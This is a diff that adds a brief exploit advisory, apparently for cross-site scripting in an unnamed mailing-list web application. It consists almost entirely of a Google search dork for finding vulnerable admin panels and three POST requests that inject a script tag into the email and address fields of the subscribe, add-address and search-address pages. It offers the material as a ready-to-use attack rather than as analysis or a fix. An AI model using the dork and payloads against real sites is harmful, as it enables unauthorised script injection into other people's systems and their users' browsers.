@@ -1,0 +1,26 @@
+::[ inurl:admin/login.php &quot;Registering Admin&quot; ]::
+
+
+
+1 - http://localhost/sub.php
+
+POSTDATA:
+email=&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&amp;choice=sub&amp;lists=1&amp;submit=submit
+
+
+
+2 - http://localhost/admin/addaddress.php
+
+POSTDATA:
+email=&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&amp;lists=1&amp;submit=submit
+
+
+then we can check it...
+
+
+
+http://localhost/admin/searchaddress.php
+
+POSTDATA:
+theaddress=&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&amp;submit=submit
+
